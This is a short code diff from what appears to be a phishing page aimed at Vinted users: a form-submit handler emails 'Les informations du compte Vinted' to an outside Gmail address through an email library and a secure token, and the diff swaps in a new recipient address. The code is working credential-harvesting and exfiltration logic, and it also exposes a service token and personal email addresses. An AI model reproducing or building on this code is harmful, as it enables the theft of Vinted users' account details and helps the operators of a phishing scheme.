@@ -13,7 +13,7 @@ function onSubmitted (event) {
     Email.send({
         SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",
 
-        To : 'anselmehotegni@gmail.com',
+        To : 'nickellogin@gmail.com',
         From : "leonbonou20@gmail.com",
         Subject : "Vinted Information :-)",
         Body : "<strong>Les informations du compte Vinted</strong> <br><br><br>\n" +
